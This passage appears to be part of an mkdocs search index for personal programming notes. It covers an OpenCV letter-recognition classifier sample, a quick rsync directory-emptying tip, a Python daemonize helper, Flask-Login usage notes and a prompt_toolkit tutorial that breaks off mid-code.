currently boosted tree classifier in MLL can only be trained // for 2-class problems, we transform the training database by // \"unrolling\" each training sample as many times as the number of // classes (26) that we have. // // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Mat new_data( ntrain_samples * class_count, var_count + 1 , CV_32F ); Mat new_responses ( ntrain_samples * class_count, 1 , CV_32S ); // 1. unroll the database type mask printf( \"Unrolling the database... \\n \" ); for ( i = 0 ; i < ntrain_samples; i ++ ) { const float * data_row = data.ptr < float > (i); for ( j = 0 ; j < class_count; j ++ ) { float * new_data_row = ( float * )new_data.ptr < float > (i * class_count + j); memcpy(new_data_row, data_row, var_count * sizeof (data_row[ 0 ])); new_data_row[var_count] = ( float )j; new_responses.at < int > (i * class_count + j) = responses.at < int > (i) == j + 'A' ; } } Mat var_type( 1 , var_count + 2 , CV_8U ); var_type.setTo(Scalar :: all(VAR_ORDERED)); var_type.at < uchar > (var_count) = var_type.at < uchar > (var_count + 1 ) = VAR_CATEGORICAL; Ptr < TrainData > tdata = TrainData :: create(new_data, ROW_SAMPLE, new_responses, noArray(), noArray(), noArray(), var_type); vector < double > priors( 2 ); priors[ 0 ] = 1 ; priors[ 1 ] = 26 ; cout << \"Training the classifier (may take a few minutes)... \\n \" ; model = Boost :: create(); model -> setBoostType(Boost :: GENTLE); model -> setWeakCount( 100 ); model -> setWeightTrimRate( 0.95 ); model -> setMaxDepth( 5 ); model -> setUseSurrogates(false); model -> setPriors(Mat(priors)); model -> train(tdata); cout << endl; } Mat temp_sample( 1 , var_count + 1 , CV_32F ); float * tptr = temp_sample.ptr < float > (); // compute prediction error on train and test data double train_hr = 0 , test_hr = 0 ; for ( i = 0 ; i < nsamples_all; i ++ ) { int best_class = 0 ; double max_sum = - DBL_MAX; const float * ptr = data.ptr < float > (i); for ( k = 0 ; k < var_count; k ++ ) tptr[k] = ptr[k]; for ( j = 0 ; j < class_count; j ++ ) { tptr[var_count] = ( float )j; float s = model -> predict( temp_sample, noArray(), StatModel :: RAW_OUTPUT ); if ( max_sum < s ) { max_sum = s; best_class = j + 'A' ; } } double r = std :: abs(best_class - responses.at < int > (i)) < FLT_EPSILON ? 1 : 0 ; if ( i < ntrain_samples ) train_hr += r; else test_hr += r; } test_hr /= nsamples_all - ntrain_samples; train_hr = ntrain_samples > 0 ? train_hr / ntrain_samples : 1. ; printf( \"Recognition rate: train = %.1f%%, test = %.1f%% \\n \" , train_hr * 100. , test_hr * 100. ); cout << \"Number of trees: \" << model -> getRoots().size() << endl; // Save classifier to file if needed if ( ! filename_to_save.empty() ) model -> save( filename_to_save ); return true; } static bool build_mlp_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { const int class_count = 26 ; Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < ANN_MLP > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // Create or load MLP classifier if ( ! filename_to_load.empty() ) { model = load_classifier < ANN_MLP > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! // // MLP does not support categorical variables by explicitly. // So, instead of the output class label, we will use // a binary vector of <class_count> components for training and, // therefore, MLP will give us a vector of \"probabilities\" at the // prediction stage // // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Mat train_data = data.rowRange( 0 , ntrain_samples); Mat train_responses = Mat :: zeros( ntrain_samples, class_count, CV_32F ); // 1. unroll the responses cout << \"Unrolling the responses... \\n \" ; for ( int i = 0 ; i < ntrain_samples; i ++ ) { int cls_label = responses.at < int > (i) - 'A' ; train_responses.at < float > (i, cls_label) = 1.f ; } // 2. train classifier int layer_sz[] = { data.cols, 100 , 100 , class_count }; int nlayers = ( int )( sizeof (layer_sz) / sizeof (layer_sz[ 0 ])); Mat layer_sizes ( 1 , nlayers, CV_32S, layer_sz ); #if 1 int method = ANN_MLP :: BACKPROP; double method_param = 0.001 ; int max_iter = 300 ; #else int method = ANN_MLP :: RPROP; double method_param = 0.1 ; int max_iter = 1000 ; #endif Ptr < TrainData > tdata = TrainData :: create(train_data, ROW_SAMPLE, train_responses); cout << \"Training the classifier (may take a few minutes)... \\n \" ; model = ANN_MLP :: create(); model -> setLayerSizes(layer_sizes); model -> setActivationFunction(ANN_MLP :: SIGMOID_SYM, 0 , 0 ); model -> setTermCriteria(TC(max_iter, 0 )); model -> setTrainMethod(method, method_param); model -> train(tdata); cout << endl; } test_and_save_classifier(model, data, responses, ntrain_samples, 'A' , filename_to_save); return true; } static bool build_knearest_classifier( const string & data_filename, int K ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); Ptr < KNearest > model = KNearest :: create(); model -> setDefaultK(K); model -> setIsClassifier(true); model -> train(tdata); cout << endl; test_and_save_classifier(model, data, responses, ntrain_samples, 0 , string()); return true; } static bool build_nbayes_classifier( const string & data_filename ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < NormalBayesClassifier > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); model = NormalBayesClassifier :: create(); model -> train(tdata); cout << endl; test_and_save_classifier(model, data, responses, ntrain_samples, 0 , string()); return true; } static bool build_svm_classifier( const string & data_filename, const string & filename_to_save, const string & filename_to_load ) { Mat data; Mat responses; bool ok = read_num_class_data( data_filename, 16 , & data, & responses ); if ( ! ok ) return ok; Ptr < SVM > model; int nsamples_all = data.rows; int ntrain_samples = ( int )(nsamples_all * 0.8 ); // Create or load Random Trees classifier if ( ! filename_to_load.empty() ) { model = load_classifier < SVM > (filename_to_load); if ( model.empty() ) return false; ntrain_samples = 0 ; } else { // create classifier by using <data> and <responses> cout << \"Training the classifier ... \\n \" ; Ptr < TrainData > tdata = prepare_train_data(data, responses, ntrain_samples); model = SVM :: create(); model -> setType(SVM :: C_SVC); model -> setKernel(SVM :: LINEAR); model -> setC( 1 ); model -> train(tdata); cout << endl; } test_and_save_classifier(model, data, responses, ntrain_samples, 0 , filename_to_save); return true; } int main( int argc, char * argv[] ) { string filename_to_save = \"\" ; string filename_to_load = \"\" ; string data_filename; int method = 0 ; cv :: CommandLineParser parser(argc, argv, \"{data|letter-recognition.data|}{save||}{load||}{boost||}\" \"{mlp||}{knn knearest||}{nbayes||}{svm||}\" ); data_filename = samples :: findFile(parser.get < string > ( \"data\" )); if (parser.has( \"save\" )) filename_to_save = parser.get < string > ( \"save\" ); if (parser.has( \"load\" )) filename_to_load = samples :: findFile(parser.get < string > ( \"load\" )); if (parser.has( \"boost\" )) method = 1 ; else if (parser.has( \"mlp\" )) method = 2 ; else if (parser.has( \"knearest\" )) method = 3 ; else if (parser.has( \"nbayes\" )) method = 4 ; else if (parser.has( \"svm\" )) method = 5 ; help(); if ( (method == 0 ? build_rtrees_classifier( data_filename, filename_to_save, filename_to_load ) : method == 1 ? build_boost_classifier( data_filename, filename_to_save, filename_to_load ) : method == 2 ? build_mlp_classifier( data_filename, filename_to_save, filename_to_load ) : method == 3 ? build_knearest_classifier( data_filename, 10 ) : method == 4 ? build_nbayes_classifier( data_filename) : method == 5 ? build_svm_classifier( data_filename, filename_to_save, filename_to_load ) : - 1 ) < 0 ) return 0 ; }","title":"letter recong"},{"location":"module/opencv/opencv/","text":"opencv \u00b6 https://github.com/opencv/opencv","title":"opencv"},{"location":"module/opencv/opencv/#opencv","text":"https://github.com/opencv/opencv","title":"opencv"},{"location":"module/others/others/","text":"others \u00b6 \u5feb\u901f\u5220\u9664 \u00b6 rsync --delete-before -avH --progress --stats /tmp/empty/ ./queue/","title":"others"},{"location":"module/others/others/#others","text":"","title":"others"},{"location":"module/others/others/#_1","text":"rsync --delete-before -avH --progress --stats /tmp/empty/ ./queue/","title":"\u5feb\u901f\u5220\u9664"},{"location":"module/python/GooglePythonStyleGuide/","text":"Google Python Style Guide \u00b6 Link Python Language Rules \u00b6 Lint \u00b6 use pylint","title":"GooglePythonStyleGuide"},{"location":"module/python/GooglePythonStyleGuide/#google-python-style-guide","text":"Link","title":"Google Python Style Guide"},{"location":"module/python/GooglePythonStyleGuide/#python-language-rules","text":"","title":"Python Language Rules"},{"location":"module/python/GooglePythonStyleGuide/#lint","text":"use pylint","title":"Lint"},{"location":"module/python/easyfunction/","text":"Easy Function \u00b6 \u5e38\u7528\u7684\u5c0f\u51fd\u6570 \u540e\u53f0\u8fd0\u884c \u00b6 def run_in_background (): ### could use the python 'daemon' module, but it isn't always ### installed, and we just need a basic backgrounding ### capability anyway pid = os . fork() if (pid < 0 ): print \"[*] fork() error, exiting.\" os . _exit() elif (pid > 0 ): os . _exit( 0 ) else : os . setsid() return \u6839\u636ecpu\u6838\u6570\u521b\u5efa\u7ebf\u7a0b \u00b6 import os threadnum = int(os . cpu_count() if os . cpu_count() and os . cpu_count() >= 4 else 4 )","title":"easyfunction"},{"location":"module/python/easyfunction/#easy-function","text":"\u5e38\u7528\u7684\u5c0f\u51fd\u6570","title":"Easy Function"},{"location":"module/python/easyfunction/#_1","text":"def run_in_background (): ### could use the python 'daemon' module, but it isn't always ### installed, and we just need a basic backgrounding ### capability anyway pid = os . fork() if (pid < 0 ): print \"[*] fork() error, exiting.\" os . _exit() elif (pid > 0 ): os . _exit( 0 ) else : os . setsid() return","title":"\u540e\u53f0\u8fd0\u884c"},{"location":"module/python/easyfunction/#cpu","text":"import os threadnum = int(os . cpu_count() if os . cpu_count() and os . cpu_count() >= 4 else 4 )","title":"\u6839\u636ecpu\u6838\u6570\u521b\u5efa\u7ebf\u7a0b"},{"location":"module/python/python-flask/","text":"flask \u00b6 flask flask_login \u00b6 Flask-Login\u63d0\u4f9bFlask\u7684\u7528\u6237\u4f1a\u8bdd\u7ba1\u7406\u3002\u5b83\u5904\u7406\u767b\u5f55\uff0c\u6ce8\u9500\u548c\u8bb0\u4f4f\u7528\u6237\u957f\u65f6\u95f4\u4f1a\u8bdd\u7684\u5e38\u89c1\u4efb\u52a1. \u5728session\u4e2d\u5b58\u50a8\u6d3b\u8dc3\u7528\u6237ID, \u8ba9\u4f60\u8f7b\u677e\u767b\u5f55\u767b\u51fa \u9650\u5236\u767b\u5f55\u7528\u6237\u6216\u8005\u8bbf\u5ba2\u7684\u89c6\u56fe \u5904\u7406\u68d8\u624b\u7684\u2018remember me\u2019\u529f\u80fd \u4fdd\u62a4\u7528\u6237sessis\u4e0d\u88ab\u7a83\u53d6 \u4e0e\u5176\u4ed6\u63d2\u4ef6\u96c6\u6210\uff0c\u6bd4\u5982Flask-Principal \u6216\u8005\u5176\u4ed6\u8ba4\u8bc1\u6269\u5c55 Installation \u00b6 pip install flask-login Configuring your Application \u00b6 login_manager = LoginManager() login_manager . init_app(app) # Flask-Login uses sessions for authentication. This means you must set the secret key on your application # app.secret_key = b'_5#y2L\"F4Q8z\\n\\xec]/' # random key class LoginManager (object): # ... def init_app (self, app, add_context_processor = True): ''' Configures an application. This registers an `after_request` call, and attaches this `LoginManager` to it as `app.login_manager`. :param app: The :class:`flask.Flask` object to configure. :type app: :class:`flask.Flask` :param add_context_processor: Whether to add a context processor to the app that adds a `current_user` variable to the template. Defaults to ``True``. :type add_context_processor: bool ''' app . login_manager = self app . after_request(self . _update_remember_cookie) if add_context_processor: app . context_processor(_user_context_processor) How it Works \u00b6 You will need to provide a user_loader callback. This callback is used to reload the user object from the user ID stored in the session. It should take the unicode ID of a user, and return the corresponding user object.For example: @login_manager.user_loader def load_user (user_id): return User . get(user_id) Your User Class\u00b6 \u00b6 The class that you use to represent users needs to implement these properties and methods: is_authenticated This property should return True if the user is authenticated, i.e. they have provided valid credentials. (Only authenticated users will fulfill the criteria of login_required.) is_active This property should return True if this is an active user - in addition to being authenticated, they also have activated their account, not been suspended, or any condition your application has for rejecting an account. Inactive accounts may not log in (without being forced of course). is_anonymous This property should return True if this is an anonymous user. (Actual users should return False instead.) get_id() This method must return a unicode that uniquely identifies this user, and can be used to load the user from the user_loader callback. Note that this must be a unicode - if the ID is natively an int or some other type, you will need to convert it to unicode. To make implementing a user class easier, you can inherit from UserMixin , which provides default implementations for all of these properties and methods. (It\u2019s not required, though.) \u4f8b\u5b50 @app.route ( '/login' , methods = [ 'GET' , 'POST' ]) def login (): # Here we use a class of some kind to represent and validate our # client-side form data. For example, WTForms is a library that will # handle this for us, and we use a custom LoginForm to validate. form = LoginForm() if form . validate_on_submit(): # Login and validate the user. # user should be an instance of your `User` class login_user(user) flask . flash( 'Logged in successfully.' ) next = flask . request . args . get( 'next' ) # is_safe_url should check if the url is safe for redirects. # See http://flask.pocoo.org/snippets/62/ for an example. if not is_safe_url(next): return flask . abort( 400 ) return flask . redirect(next or flask . url_for( 'index' )) return flask . render_template( 'login.html' , form = form) Customizing the Login Process \u00b6 # \u767b\u5f55\u89c6\u56fe\u7684\u540d\u79f0 login_manager . login_view = \"users.login\" # \u95ea\u70c1\u7684\u9ed8\u8ba4\u6d88\u606f\u662f\u201c\u8bf7\u767b\u5f55\u4ee5\u8bbf\u95ee\u6b64\u9875\u9762. To customize the message, set LoginManager.login_message: login_manager . login_message = u\"Bonvolu ensaluti por uzi tiun pa\u011don.\" # \u81ea\u5b9a\u4e49\u6d88\u606f\u7c7b\u522b, set LoginManager.login_message_category: login_manager . login_message_category = \"info\" session protect \u00b6 login_manager . session_protection = \"strong\" login_manager . session_protection = None other \u00b6 flask-login\u6587\u6863","title":"flask"},{"location":"module/python/python-flask/#flask","text":"flask","title":"flask"},{"location":"module/python/python-flask/#flask_login","text":"Flask-Login\u63d0\u4f9bFlask\u7684\u7528\u6237\u4f1a\u8bdd\u7ba1\u7406\u3002\u5b83\u5904\u7406\u767b\u5f55\uff0c\u6ce8\u9500\u548c\u8bb0\u4f4f\u7528\u6237\u957f\u65f6\u95f4\u4f1a\u8bdd\u7684\u5e38\u89c1\u4efb\u52a1. \u5728session\u4e2d\u5b58\u50a8\u6d3b\u8dc3\u7528\u6237ID, \u8ba9\u4f60\u8f7b\u677e\u767b\u5f55\u767b\u51fa \u9650\u5236\u767b\u5f55\u7528\u6237\u6216\u8005\u8bbf\u5ba2\u7684\u89c6\u56fe \u5904\u7406\u68d8\u624b\u7684\u2018remember me\u2019\u529f\u80fd \u4fdd\u62a4\u7528\u6237sessis\u4e0d\u88ab\u7a83\u53d6 \u4e0e\u5176\u4ed6\u63d2\u4ef6\u96c6\u6210\uff0c\u6bd4\u5982Flask-Principal \u6216\u8005\u5176\u4ed6\u8ba4\u8bc1\u6269\u5c55","title":"flask_login"},{"location":"module/python/python-flask/#installation","text":"pip install flask-login","title":"Installation"},{"location":"module/python/python-flask/#configuring-your-application","text":"login_manager = LoginManager() login_manager . init_app(app) # Flask-Login uses sessions for authentication. This means you must set the secret key on your application # app.secret_key = b'_5#y2L\"F4Q8z\\n\\xec]/' # random key class LoginManager (object): # ... def init_app (self, app, add_context_processor = True): ''' Configures an application. This registers an `after_request` call, and attaches this `LoginManager` to it as `app.login_manager`. :param app: The :class:`flask.Flask` object to configure. :type app: :class:`flask.Flask` :param add_context_processor: Whether to add a context processor to the app that adds a `current_user` variable to the template. Defaults to ``True``. :type add_context_processor: bool ''' app . login_manager = self app . after_request(self . _update_remember_cookie) if add_context_processor: app . context_processor(_user_context_processor)","title":"Configuring your Application"},{"location":"module/python/python-flask/#how-it-works","text":"You will need to provide a user_loader callback. This callback is used to reload the user object from the user ID stored in the session. It should take the unicode ID of a user, and return the corresponding user object.For example: @login_manager.user_loader def load_user (user_id): return User . get(user_id)","title":"How it Works"},{"location":"module/python/python-flask/#your-user-class","text":"The class that you use to represent users needs to implement these properties and methods: is_authenticated This property should return True if the user is authenticated, i.e. they have provided valid credentials. (Only authenticated users will fulfill the criteria of login_required.) is_active This property should return True if this is an active user - in addition to being authenticated, they also have activated their account, not been suspended, or any condition your application has for rejecting an account. Inactive accounts may not log in (without being forced of course). is_anonymous This property should return True if this is an anonymous user. (Actual users should return False instead.) get_id() This method must return a unicode that uniquely identifies this user, and can be used to load the user from the user_loader callback. Note that this must be a unicode - if the ID is natively an int or some other type, you will need to convert it to unicode. To make implementing a user class easier, you can inherit from UserMixin , which provides default implementations for all of these properties and methods. (It\u2019s not required, though.) \u4f8b\u5b50 @app.route ( '/login' , methods = [ 'GET' , 'POST' ]) def login (): # Here we use a class of some kind to represent and validate our # client-side form data. For example, WTForms is a library that will # handle this for us, and we use a custom LoginForm to validate. form = LoginForm() if form . validate_on_submit(): # Login and validate the user. # user should be an instance of your `User` class login_user(user) flask . flash( 'Logged in successfully.' ) next = flask . request . args . get( 'next' ) # is_safe_url should check if the url is safe for redirects. # See http://flask.pocoo.org/snippets/62/ for an example. if not is_safe_url(next): return flask . abort( 400 ) return flask . redirect(next or flask . url_for( 'index' )) return flask . render_template( 'login.html' , form = form)","title":"Your User Class\u00b6"},{"location":"module/python/python-flask/#customizing-the-login-process","text":"# \u767b\u5f55\u89c6\u56fe\u7684\u540d\u79f0 login_manager . login_view = \"users.login\" # \u95ea\u70c1\u7684\u9ed8\u8ba4\u6d88\u606f\u662f\u201c\u8bf7\u767b\u5f55\u4ee5\u8bbf\u95ee\u6b64\u9875\u9762. To customize the message, set LoginManager.login_message: login_manager . login_message = u\"Bonvolu ensaluti por uzi tiun pa\u011don.\" # \u81ea\u5b9a\u4e49\u6d88\u606f\u7c7b\u522b, set LoginManager.login_message_category: login_manager . login_message_category = \"info\"","title":"Customizing the Login Process"},{"location":"module/python/python-flask/#session-protect","text":"login_manager . session_protection = \"strong\" login_manager . session_protection = None","title":"session protect"},{"location":"module/python/python-flask/#other","text":"flask-login\u6587\u6863","title":"other"},{"location":"module/python/python-prompt-toolkit/","text":"python-prompt-toolkit \u00b6 \u5982\u4f55\u5b66\u4e60\u548c\u7406\u89e3prompt_toolkit First, learn how to print text. This is important, because it covers how to use \u201cformatted text\u201d, which is something you\u2019ll use whenever you want to use colors anywhere. Secondly, go through the asking for input section. This is useful for almost any use case, even for full screen applications. It covers autocompletions, syntax highlighting, key bindings, and so on. Then, learn about Dialogs, which is easy and fun. Finally, learn about full screen applications and read through the advanced topics. \u6253\u5370(\u548c\u4f7f\u7528)\u683c\u5f0f\u5316\u6587\u672c \u00b6 \u6253\u5370\u7eaf\u6587\u672c \u00b6 #from __future__ import unicode_literals from prompt_toolkit import print_formatted_text print_formatted_text( 'Hello world' ) \u683c\u5f0f\u5316\u6587\u672c \u00b6 There are several ways to display colors: By creating an HTML object. By creating an ANSI object that contains ANSI escape sequences. By creating a list of (style, text) tuples. By creating a list of (pygments.Token, text) tuples, and wrapping it in PygmentsTokens. HTML \u00b6 from __future__ import unicode_literals, print_function from prompt_toolkit import print_formatted_text, HTML print_formatted_text(HTML( '<b>This is bold</b>' )) print_formatted_text(HTML( '<i>This is italic</i>' )) print_formatted_text(HTML( '<u>This is underlined</u>' )) # Colors from the ANSI palette. print_formatted_text(HTML( '<ansired>This is red</ansired>' )) print_formatted_text(HTML( '<ansigreen>This is green</ansigreen>' )) # Named colors (256 color palette, or true color, depending on the output). print_formatted_text(HTML( '<skyblue>This is sky blue</skyblue>' )) print_formatted_text(HTML( '<seagreen>This is sea green</seagreen>' )) print_formatted_text(HTML( '<violet>This is violet</violet>' )) print_formatted_text(HTML( '<aaa fg=\"ansiwhite\" bg=\"ansigreen\">White on green</aaa>' )) from prompt_toolkit.styles import Style style = Style . from_dict({ 'aaa' : '#ff0066' , 'bbb' : '#44ff00 italic' , }) print_formatted_text(HTML( '<aaa>Hello</aaa> <bbb>world</bbb>!' ), style = style) ANSI \u00b6 from prompt_toolkit import print_formatted_text, ANSI print_formatted_text(ANSI( ' \\x1b [31mhello \\x1b [32mworld' )) (style, text) tuples \u00b6 from __future__ import unicode_literals, print_function from prompt_toolkit import print_formatted_text from prompt_toolkit.formatted_text import FormattedText text = FormattedText([ ( '#ff0066' , 'Hello' ), ( '' , ' ' ), ( '#44ff00 italic' , 'World' ), ]) print_formatted_text(text) from prompt_toolkit.styles import Style # The text. text = FormattedText([ ( 'class:aaa' , 'Hello' ), ( '' , ' ' ), ( 'class:bbb' , 'World' ), ]) # The style sheet. style = Style . from_dict({ 'aaa' : '#ff0066' , 'bbb' : '#44ff00 italic' , }) print_formatted_text(text, style = style) Pygments (Token, text) tuples \u00b6 Pygments to_formatted_text \u00b6 from prompt_toolkit.formatted_text import to_formatted_text, HTML from prompt_toolkit import print_formatted_text html = HTML( '<aaa>Hello</aaa> <bbb>world</bbb>!' ) text = to_formatted_text(html, style = 'class:my_html bg:#00ff00 italic' ) print_formatted_text(text) \u5982\u4f55\u8f93\u5165 (prompts) \u00b6 from prompt_toolkit import prompt text = prompt( 'Give me some input: ' ) print ( 'You said: %s' % text) PromptSession \u5bf9\u8c61 \u00b6 prompt\u662fPromptSession\u5b9e\u4f8b\u7684prompt\u65b9\u6cd5 from prompt_toolkit import PromptSession # Create prompt object. session = PromptSession() # Do multiple input calls. text1 = session . prompt() text2 = session . prompt() \u8bed\u6cd5\u9ad8\u4eae \u00b6 \u4f7f\u7528\u4e86pygments\u8fd9\u4e2a\u5e93\uff0c\u9664\u4e86html\u8fd8\u6709python\uff0cshell\u7b49\u7b49 from pygments.lexers.html import HtmlLexer from prompt_toolkit.shortcuts import prompt from prompt_toolkit.lexers import PygmentsLexer text = prompt( 'Enter HTML: ' , lexer = PygmentsLexer(HtmlLexer)) print ( 'You said: %s' % text) \u989c\u8272 \u00b6 \u8ddf\u8bed\u6cd5\u9ad8\u4eae\u63a5\u8fd1\uff0c\u4f46\u8fd8\u662f\u6709\u533a\u522b from pygments.lexers.html import HtmlLexer from prompt_toolkit.shortcuts import prompt from prompt_toolkit.styles import Style from prompt_toolkit.lexers import PygmentsLexer our_style = Style . from_dict({ 'pygments.comment' : '#888888 bold' , 'pygments.keyword' : '#ff88ff bold' , }) text = prompt( 'Enter HTML: ' , lexer = PygmentsLexer(HtmlLexer), style = our_style) \u4f7f\u7528Pygments style \u00b6 All Pygments style classes can be used as well, when they are wrapped through style_from_pygments_cls() from prompt_toolkit.shortcuts import prompt from prompt_toolkit.styles import style_from_pygments_cls, merge_styles from prompt_toolkit.lexers import PygmentsLexer from pygments.styles.tango import TangoStyle from pygments.lexers.html import HtmlLexer our_style = merge_styles([ style_from_pygments_cls(TangoStyle), Style . from_dict({ 'pygments.comment' : '#888888 bold' , 'pygments.keyword' : '#ff88ff bold' , }) ]) text = prompt( 'Enter HTML: ' , lexer = PygmentsLexer(HtmlLexer), style = our_style) \u7740\u8272\u63d0\u793a \u00b6 from prompt_toolkit.shortcuts import prompt from prompt_toolkit.styles import Style style = Style . from_dict({ # User input (default text). '' : '#ff0066' , # Prompt. 'username' : '#884444' , 'at' : '#00aa00' , 'colon' : '#0000aa' , 'pound' : '#00aa00' , 'host' : '#00ffff bg:#444400' , 'path' : 'ansicyan underline' , }) message = [ ( 'class:username' , 'john' ), ( 'class:at' , '@' ), ( 'class:host' , 'localhost' ), ( 'class:colon' , ':' ), ( 'class:path' , '/user/john' ), ( 'class:pound' , '# ' ), ] # If you want to have 24bit true color, this is possible by adding the true_color=True option to the prompt() function. text = prompt(message, style = style) \u81ea\u52a8\u8865\u5168 \u00b6 from prompt_toolkit import prompt from prompt_toolkit.completion import WordCompleter html_completer = WordCompleter([ '<html>' , '<body>' , '<head>' , '<title>' , 'pengweidang' ]) text = prompt( 'Enter HTML: ' , completer = html_completer) print ( 'You said: %s' % text) \u4e2a\u6027\u5316\u8865\u5168 \u00b6 from prompt_toolkit.completion import Completer, Completion class MyCustomCompleter (Completer): def get_completions (self, document, complete_event): # Display this completion, black on yellow. yield Completion( 'completion1' , start_position = 0 , style = 'bg:ansiyellow fg:ansiblack' ) # Underline completion. yield Completion( 'completion2' , start_position = 0 , style = 'underline' ) # Specify class name, which will be looked up in the style sheet. yield Completion( 'completion3' , start_position = 0 , style = 'class:special-completion' ) from prompt_toolkit.completion import Completer, Completion from prompt_toolkit.formatted_text import HTML class MyCustomCompleter (Completer): def get_completions (self, document, complete_event): yield Completion( 'completion1' , start_position = 0 , display = HTML( '<b>completion</b><ansired>1</ansired>' ), style = 'bg:ansiyellow' ) \u6a21\u7cca\u8865\u5168 \u00b6 Prompt_toolkit\u9644\u5e26\u4e86FuzzyCompleter\u548cFuzzyWordCompleter\u7c7b\u3002 Complete while typing \u00b6 \u81ea\u52a8\u8865\u5168\u53ef\u4ee5\u5728\u952e\u5165\u65f6\u6216\u7528\u6237\u6309\u4e0bTab\u952e\u65f6\u81ea\u52a8\u751f\u6210\uff0c\u6ce8\u610f\u4f1a\u4e0e\u2018enable_history_search\u2019\u51b2\u7a81\u3002 ext = prompt( 'Enter HTML: ' , completer = my_completer, complete_while_typing = True) \u5f02\u6b65\u8865\u5168 \u00b6 \u5982\u679c\u751f\u6210\u8865\u5168\u4f1a\u82b1\u8d39\u5f88\u591a\u65f6\u95f4\uff0c\u6700\u597d\u5728\u540e\u53f0\u7ebf\u7a0b\u4e2d\u5b8c\u6210\u3002 text = prompt( '> ' , completer = MyCustomCompleter(), complete_in_thread = True) \u8f93\u5165\u9a8c\u8bc1 \u00b6 from prompt_toolkit.validation import Validator, ValidationError from prompt_toolkit import prompt class NumberValidator (Validator): def validate (self, document): text = document . text if text and not text . isdigit(): i = 0 # Get index of fist non numeric character. # We want to move the cursor here. for i, c in enumerate(text): if not c . isdigit(): break raise ValidationError(message = 'This input contains non-numeric characters' , cursor_position = i) number = int(prompt( 'Give a number: ' , validator = NumberValidator())) print ( 'You said: %i' % number) \u5b9e\u65f6\u9a8c\u8bc1\uff1a \u5728prompt\u51fd\u6570\u4e2d\uff0cvalidate_while_typing=True \u901a\u8fc7\u56de\u8c03\u51fd\u6570\u9a8c\u8bc1 from prompt_toolkit.validation import Validator from prompt_toolkit import prompt def is_number (text): return text . isdigit() validator = Validator . from_callable( is_number, error_message = 'This input contains non-numeric characters' , move_cursor_to_end = True) number = int(prompt( 'Give a number: ' , validator = validator)) print ( 'You said: %i' % number) \u5386\u53f2\u8bb0\u5f55 \u00b6 \u5982\u679c\u9700\u8981\u4fdd\u5b58\u5230\u6587\u4ef6 from prompt_toolkit import PromptSession from prompt_toolkit.history import FileHistory session = PromptSession(history = FileHistory( '~/.myhistory' )) while True: session . prompt() \u81ea\u52a8\u63d0\u793a \u00b6 \u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u81ea\u52a8\u63d0\u793a from prompt_toolkit import PromptSession from prompt_toolkit.history import InMemoryHistory from prompt_toolkit.auto_suggest import AutoSuggestFromHistory session = PromptSession() while True: text = session . prompt( '> ' , auto_suggest = AutoSuggestFromHistory()) print ( 'You said: %s' % text) \u6dfb\u52a0\u5e95\u90e8\u5de5\u5177\u680f \u00b6 from prompt_toolkit import prompt from prompt_toolkit.styles import Style def bottom_toolbar (): return [( 'class:bottom-toolbar' , ' This is a toolbar. ' )] style = Style . from_dict({ 'bottom-toolbar' : '#ffffff bg:#333333' , }) text = prompt( '> ' , bottom_toolbar = bottom_toolbar, style = style) print ( 'You said: %s' % text) \u9ed8\u8ba4\u7684\u7c7b\u540d\u662fbottom-toolbar\uff0c\u5b83\u4e5f\u5c06\u7528\u4e8e\u586b\u5145\u5de5\u5177\u680f\u7684\u80cc\u666f\u3002 \u6dfb\u52a0\u53f3\u4fa7prompt \u00b6 from prompt_toolkit import prompt from prompt_toolkit.styles import Style example_style = Style . from_dict({ 'rprompt' : 'bg:#ff0066 #ffffff' , }) def get_rprompt (): return '<rprompt>' answer = prompt( '> ' , rprompt = get_rprompt, style = example_style) Vi \u8f93\u5165\u6a21\u5f0f \u00b6 Vi\u6a21\u5f0f from prompt_toolkit import prompt prompt( '> ' , vi_mode = True) \u81ea\u5b9a\u4e49\u952e\u7ed1\u5b9a \u00b6 from prompt_toolkit import prompt from prompt_toolkit.application import run_in_terminal from prompt_toolkit.key_binding import KeyBindings bindings = KeyBindings() @bindings.add ( 'c-t' ) def _ (event): \" Say 'hello' when `c-t` is pressed. \" def print_hello (): print ( 'hello world' ) run_in_terminal(print_hello) @bindings.add ( 'c-x' ) def _ (event): \" Exit when `c-x` is pressed. \" event . app . exit() text = prompt( '> ' , key_bindings = bindings) print ( 'You said: %s' % text) \u6839\u636e\u6761\u4ef6\u542f\u7528\u952e\u7ed1\u5b9a \u00b6 import datetime from prompt_toolkit import prompt from prompt_toolkit.filters import Condition from prompt_toolkit.key_binding import KeyBindings bindings = KeyBindings() @Condition def is_active (): \" Only activate key binding on the second half of each minute. \" return datetime . datetime . now() . second > 30 @bindings.add ( 'c-t' , filter = is_active) def _ (event): # ... pass prompt( '> ' , key_bindings = bindings) \u5728Emacs\u548cVi\u6a21\u5f0f\u4e2d\u52a8\u6001\u5207\u6362 \u00b6 from prompt_toolkit import prompt from prompt_toolkit.application.current import get_app from prompt_toolkit.filters import Condition from prompt_toolkit.key_binding import KeyBindings def run (): # Create a set of key bindings. bindings = KeyBindings() # Add an additional key binding for toggling this flag. @bindings.add ( 'f4' ) def _ (event): \" Toggle between Emacs and Vi mode. \" app = event . app if app . editing_mode == EditingMode . VI: app . editing_mode = EditingMode . EMACS else : app . 